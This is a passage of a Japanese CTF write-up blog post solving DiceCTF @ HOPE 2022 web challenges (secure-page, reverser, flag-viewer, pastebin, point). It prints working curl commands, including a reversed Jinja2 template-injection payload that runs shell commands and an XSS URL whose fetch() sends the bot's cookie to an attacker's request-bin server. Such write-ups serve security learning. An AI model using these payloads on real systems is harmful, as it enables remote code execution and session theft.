@@ -1,0 +1,232 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[DiceCTF @ HOPE 2022] My own writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="DiceCTF @ HOPE 2022が7/23 3:00 - 7/25 3:00(JST)の日程で開催されました. webを解いていたので, そのwriteupを以下に記します.
+[web] secure-page(293 solves) [web] reverser(225 solves) [web] flag-viewer(217 solves) [web] pastebin(139 solves) [web] point(111 solves) [web] oeps(83 solves) [web] secure-page(293 solves) cookieとしてadmin=trueを送信すると, flagが得られるようです.
+admin = request.cookies.get('admin', '') headers = {} if admin == '': headers['set-cookie'] = 'admin=false' if admin == 'true': return (200, ''' <title>Secure Page</title> <link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34; /> <div class=&#34;container&#34;> <h1>Secure Page</h1> %s </div> ''' % os.environ.get('FLAG', 'flag is missing!"><meta property="og:image" content><meta property="og:title" content="[DiceCTF @ HOPE 2022] My own writeup"><meta property="og:description" content="DiceCTF @ HOPE 2022が7/23 3:00 - 7/25 3:00(JST)の日程で開催されました. webを解いていたので, そのwriteupを以下に記します.
+[web] secure-page(293 solves) [web] reverser(225 solves) [web] flag-viewer(217 solves) [web] pastebin(139 solves) [web] point(111 solves) [web] oeps(83 solves) [web] secure-page(293 solves) cookieとしてadmin=trueを送信すると, flagが得られるようです.
+admin = request.cookies.get('admin', '') headers = {} if admin == '': headers['set-cookie'] = 'admin=false' if admin == 'true': return (200, ''' <title>Secure Page</title> <link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34; /> <div class=&#34;container&#34;> <h1>Secure Page</h1> %s </div> ''' % os.environ.get('FLAG', 'flag is missing!"><meta property="og:type" content="article"><meta property="og:url" content="/posts/22/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-07-25T03:00:01+09:00"><meta property="article:modified_time" content="2022-07-25T03:00:01+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[DiceCTF @ HOPE 2022] My own writeup"><meta name=twitter:description content="DiceCTF @ HOPE 2022が7/23 3:00 - 7/25 3:00(JST)の日程で開催されました. webを解いていたので, そのwriteupを以下に記します.
+[web] secure-page(293 solves) [web] reverser(225 solves) [web] flag-viewer(217 solves) [web] pastebin(139 solves) [web] point(111 solves) [web] oeps(83 solves) [web] secure-page(293 solves) cookieとしてadmin=trueを送信すると, flagが得られるようです.
+admin = request.cookies.get('admin', '') headers = {} if admin == '': headers['set-cookie'] = 'admin=false' if admin == 'true': return (200, ''' <title>Secure Page</title> <link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34; /> <div class=&#34;container&#34;> <h1>Secure Page</h1> %s </div> ''' % os.environ.get('FLAG', 'flag is missing!"><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[DiceCTF @ HOPE 2022] My own writeup</h1><div class=meta>Posted on Jul 25, 2022</div></div><nav id=TableOfContents><ol><li><a href=#web-secure-page293-solves>[web] secure-page(293 solves)</a></li><li><a href=#web-reverser225-solves>[web] reverser(225 solves)</a></li><li><a href=#web-flag-viewer217-solves>[web] flag-viewer(217 solves)</a></li><li><a href=#web-pastebin139-solves>[web] pastebin(139 solves)</a></li><li><a href=#web-point111-solves>[web] point(111 solves)</a></li><li><a href=#web-oeps83-solves>[web] oeps(83 solves)</a></li><li><a href=#感想>感想</a></li></ol></nav><section class=body><p>DiceCTF @ HOPE 2022が7/23 3:00 - 7/25 3:00(JST)の日程で開催されました. webを解いていたので, そのwriteupを以下に記します.</p><ul><li>[web] secure-page(293 solves)</li><li>[web] reverser(225 solves)</li><li>[web] flag-viewer(217 solves)</li><li>[web] pastebin(139 solves)</li><li>[web] point(111 solves)</li><li>[web] oeps(83 solves)</li></ul><h1 id=web-secure-page293-solves>[web] secure-page(293 solves)</h1><p>cookieとして<code>admin=true</code>を送信すると, flagが得られるようです.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span>admin <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;admin&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>headers <span style=color:#f92672>=</span> {}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> admin <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>:
+</span></span><span style=display:flex><span>    headers[<span style=color:#e6db74>&#39;set-cookie&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;admin=false&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> admin <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;true&#39;</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (<span style=color:#ae81ff>200</span>, <span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;title&gt;Secure Page&lt;/title&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34; /&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;h1&gt;Secure Page&lt;/h1&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span> <span style=color:#f92672>%</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;FLAG&#39;</span>, <span style=color:#e6db74>&#39;flag is missing!&#39;</span>), headers)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (<span style=color:#ae81ff>200</span>, <span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;title&gt;Secure Page&lt;/title&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34; /&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;h1&gt;Secure Page&lt;/h1&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            Sorry, you must be the admin to view this content!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>, headers)
+</span></span></code></pre></div><p>cookieを送信してflagを得ます.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -b &#39;admin=true&#39; https://secure-page.mc.ax/  
+
+            &lt;title&gt;Secure Page&lt;/title&gt;
+            &lt;link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34; /&gt;
+            &lt;div class=&#34;container&#34;&gt;
+                &lt;h1&gt;Secure Page&lt;/h1&gt;
+                hope{signatures_signatures_signatures}
+            &lt;/div&gt;
+        %      
+</code></pre><h1 id=web-reverser225-solves>[web] reverser(225 solves)</h1><p>ユーザーの入力をそのままflaskの<code>render_template_string()</code>に挿入しています. サーバーサイドテンプレートインジェクションが可能です.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, render_template_string, request
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.post</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reverse</span>():
+</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;link rel=&#34;stylesheet&#34; href=&#34;style.css&#34; /&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;h1&gt;Text Reverser&lt;/h1&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            Reverse any text... now as a web service!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;form method=&#34;POST&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;input type=&#34;text&#34; name=&#34;text&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;input type=&#34;submit&#34; value=&#34;Reverse&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;/form&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;p&gt;Output: </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>    output <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;text&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template_string(result <span style=color:#f92672>%</span> output)
+</span></span></code></pre></div><p>こちらの<a href=https://blog.hamayanhamayan.com/entry/2021/12/15/225142>ブログ</a>を参考に, コード実行を行います. ペイロードとして<code>{{request.application.__globals__.__builtins__.__import__('os').popen('ls -lah').read()}}</code>を送信します. ペイロードを反転させる必要があるため, 反転して送信します.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>{% raw %}
+$ curl -X POST --data-urlencode &#34;text=}})(daer.)&#39;hal- sl&#39;(nepop.)&#39;so&#39;(__tropmi__.__snitliub__.__slabolg__.noitacilppa.tseuqer{{&#34;  https://reverser.mc.ax/
+{% endraw %}
+
+
+        &lt;link rel=&#34;stylesheet&#34; href=&#34;style.css&#34; /&gt;
+        &lt;div class=&#34;container&#34;&gt;
+            &lt;h1&gt;Text Reverser&lt;/h1&gt;
+            Reverse any text... now as a web service!
+            &lt;form method=&#34;POST&#34;&gt;
+                &lt;input type=&#34;text&#34; name=&#34;text&#34;&gt;
+                &lt;input type=&#34;submit&#34; value=&#34;Reverse&#34;&gt;
+            &lt;/form&gt;
+            &lt;p&gt;Output: total 16K
+drwxr-xr-x 1 root root 4.0K Jul 22 19:41 .
+drwxr-xr-x 1 root root 4.0K Jul 22 19:55 ..
+-rw-r--r-- 1 root root 1.5K Jul 22 19:41 app.py
+-rw-r--r-- 1 root root   28 Jul 22 19:41 flag-f5953883-3dae-4a0f-9660-d00b50ff4012.txt
+&lt;/p&gt;
+        &lt;/div&gt;
+    %                                            
+</code></pre><p>flagが書かれているファイルは<code>flag-f5953883-3dae-4a0f-9660-d00b50ff4012.txt</code>であることがわかるので, 中身を表示します.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>{% raw %}
+$ curl -X POST --data-urlencode &#34;text=}})(daer.)&#39;txt.2104ff05b00d-0669-f0a4-ead3-3883595f-galf tac&#39;(nepop.)&#39;so&#39;(__tropmi__.__snitliub__.__slabolg__.noitacilppa.tseuqer{{&#34;  https://reverser.mc.ax/
+{% endraw %}
+        &lt;link rel=&#34;stylesheet&#34; href=&#34;style.css&#34; /&gt;
+        &lt;div class=&#34;container&#34;&gt;
+            &lt;h1&gt;Text Reverser&lt;/h1&gt;
+            Reverse any text... now as a web service!
+            &lt;form method=&#34;POST&#34;&gt;
+                &lt;input type=&#34;text&#34; name=&#34;text&#34;&gt;
+                &lt;input type=&#34;submit&#34; value=&#34;Reverse&#34;&gt;
+            &lt;/form&gt;
+            &lt;p&gt;Output: hope{cant_misuse_templates}
+&lt;/p&gt;
+        &lt;/div&gt;
+    %                  
+</code></pre><h1 id=web-flag-viewer217-solves>[web] flag-viewer(217 solves)</h1><p>リクエストボディで<code>user=admin</code>を送信するとflagが得られます.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#a6e22e>@server.post</span>(<span style=color:#e6db74>&#39;/flag&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>flag</span>(request):
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> request<span style=color:#f92672>.</span>post()
+</span></span><span style=display:flex><span>    user <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;user&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> user <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;admin&#39;</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (<span style=color:#ae81ff>302</span>, <span style=color:#e6db74>&#39;/?message=Only the &#34;admin&#34; user can see the flag!&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (<span style=color:#ae81ff>302</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;/?message=</span><span style=color:#e6db74>{</span>os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;FLAG&#34;</span>, <span style=color:#e6db74>&#34;flag missing!&#34;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span></code></pre></div><p>locationヘッダにflagが格納されます.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -v -X POST --data-urlencode &#34;user=admin&#34; https://flag-viewer.mc.ax/flag 
+...
+&lt; HTTP/2 302 
+&lt; content-type: text/plain; charset=utf-8
+&lt; date: Sat, 23 Jul 2022 15:11:10 GMT
+&lt; location: /?message=hope%7Boops_client_side_validation_again%7D
+&lt; server: Python/3.9 aiohttp/3.8.1
+&lt; content-length: 10
+</code></pre><h1 id=web-pastebin139-solves>[web] pastebin(139 solves)</h1><p>XSSの問題です. 以下のadmin botが用意されています. admin botは問題サイト(pastebin.mc.ax)のcookieにflagを格納して, ユーザーが指定するurlを訪れます.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>import</span> <span style=color:#a6e22e>flag</span> <span style=color:#a6e22e>from</span> <span style=color:#e6db74>&#39;./flag.txt&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>export</span> <span style=color:#66d9ef>default</span> {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>id</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;pastebin&#39;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;pastebin&#39;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>10000</span>,
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>handler</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>url</span>, <span style=color:#a6e22e>ctx</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>page</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>ctx</span>.<span style=color:#a6e22e>newPage</span>()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>setCookie</span>({ <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;flag&#39;</span>, <span style=color:#a6e22e>value</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>flag</span>.<span style=color:#a6e22e>trim</span>(), <span style=color:#a6e22e>domain</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;pastebin.mc.ax&#39;</span> })
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#66d9ef>goto</span>(<span style=color:#a6e22e>url</span>, { <span style=color:#a6e22e>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span>, <span style=color:#a6e22e>waitUntil</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;domcontentloaded&#39;</span> })
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>waitForTimeout</span>(<span style=color:#ae81ff>5000</span>)
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>問題サイト(pastebin.mc.ax)では<code>/flash</code>でmessageクエリパラメータを入力でき, そのパラメータは特に有効なチェックがなされることなくhtmlに表示されます. このパラメータを用いてXSSを行います.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>error</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>headers</span><span style=color:#f92672>?</span>.<span style=color:#a6e22e>cookie</span><span style=color:#f92672>?</span>.<span style=color:#a6e22e>match</span>(<span style=color:#e6db74>/(?:^|; )error=(.+?)(?:;|$)/</span>)<span style=color:#f92672>?</span>.[<span style=color:#ae81ff>1</span>];
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#39;html&#39;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#e6db74>`
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34; /&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;h1&gt;Yet Another Pastebin&lt;/h1&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;form id=&#34;form&#34; method=&#34;POST&#34; action=&#34;/new&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;textarea form=&#34;form&#34; name=&#34;paste&#34;&gt;&lt;/textarea&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;input type=&#34;submit&#34; value=&#34;Submit&#34; /&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/form&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;div style=&#34;color: red&#34;&gt;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>error</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  `</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/flash&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>message</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>message</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>set</span>(<span style=color:#e6db74>&#39;set-cookie&#39;</span>, <span style=color:#e6db74>`error=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>message</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>redirect</span>(<span style=color:#e6db74>&#39;/&#39;</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>以下のurlにadmin botを訪問させます. Request Binなどでサーバを立て, XSS経由でjavascriptを実行してadmin botのcookie(flag)を送信させます.</p><pre tabindex=0><code>https://pastebin.mc.ax/flash?message=&lt;script&gt;fetch(`[Request Binなどで立てたサーバのurl]?cookie=${document.cookie}`)&lt;/script&gt;
+</code></pre><p>無事にflagが送信されました.
+<img src=/images/posts/22/flag.png alt=flag></p><h1 id=web-point111-solves>[web] point(111 solves)</h1><p>リクエストボディで渡したjsonがGoの構造体に変換されます.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.go data-lang=.go><span style=display:flex><span><span style=color:#66d9ef>type</span> <span style=color:#a6e22e>importantStuff</span> <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>Whatpoint</span> <span style=color:#66d9ef>string</span> <span style=color:#e6db74>`json:&#34;what_point&#34;`</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>HandleFunc</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>w</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>ResponseWriter</span>, <span style=color:#a6e22e>r</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Method</span> {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>MethodGet</span>:
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Fprint</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;Hello, world&#34;</span>)
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>MethodPost</span>:
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>body</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ReadAll</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Body</span>)
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Println</span>(string(<span style=color:#a6e22e>body</span>))
+</span></span><span style=display:flex><span>            <span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>whatpoint</span> <span style=color:#a6e22e>importantStuff</span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>err</span> = <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>Unmarshal</span>(<span style=color:#a6e22e>body</span>, <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>whatpoint</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#a6e22e>err</span>)
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Fprintf</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;Something went wrong 3&#34;</span>)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>            }
+</span></span></code></pre></div><p>flagを取るためには<code>whatpoint</code>構造体のキー<code>Whatpoint</code>の値を<code>that_point</code>にしなければなりません.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.go data-lang=.go><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#a6e22e>whatpoint</span>.<span style=color:#a6e22e>Whatpoint</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;that_point&#34;</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Fprintf</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;Congrats! Here is the flag: %s&#34;</span>, <span style=color:#a6e22e>flag</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Fprintf</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;Something went wrong 4&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>キー<code>Whatpoint</code>のjsonタグ名が<code>what_point</code>に設定されているため, jsonのキーも<code>what_point</code>を指定したいところです. しかし, 入力チェックが行われるため入力値のjsonキーには<code>what_point</code>の文字列を含めることはできません.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Contains</span>(string(<span style=color:#a6e22e>body</span>), <span style=color:#e6db74>&#34;what_point&#34;</span>) <span style=color:#f92672>||</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Contains</span>(string(<span style=color:#a6e22e>body</span>), <span style=color:#e6db74>&#34;\\&#34;</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Fprintf</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;Something went wrong 2&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><a href=https://go.dev/blog/json>こちら</a>を参考にすると, 構造体に指定したjsonタグ名は完全一致である必要はないそうです.</p><blockquote><p>How does Unmarshal identify the fields in which to store the decoded data? For a given JSON key &ldquo;Foo&rdquo;, Unmarshal will look through the destination struct’s fields to find (in order of preference):</p><ul><li>An exported field with a tag of &ldquo;Foo&rdquo; (see the Go spec for more on struct tags),</li><li>An exported field named &ldquo;Foo&rdquo;, or</li><li>An exported field named &ldquo;FOO&rdquo; or &ldquo;FoO&rdquo; or some other case-insensitive match of &ldquo;Foo&rdquo;.</li></ul></blockquote><p><code>What_point</code>や<code>WHAT_POINT</code>でも許容され, flagが得られます.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -X POST -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;What_point&#34;:&#34;that_point&#34;}&#39; https://point.mc.ax/ 
+Congrats! Here is the flag: hope{cA5e_anD_P0iNt_Ar3_1mp0rT4nT}
+$ curl -X POST -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;WHAT_POINT&#34;:&#34;that_point&#34;}&#39; https://point.mc.ax/
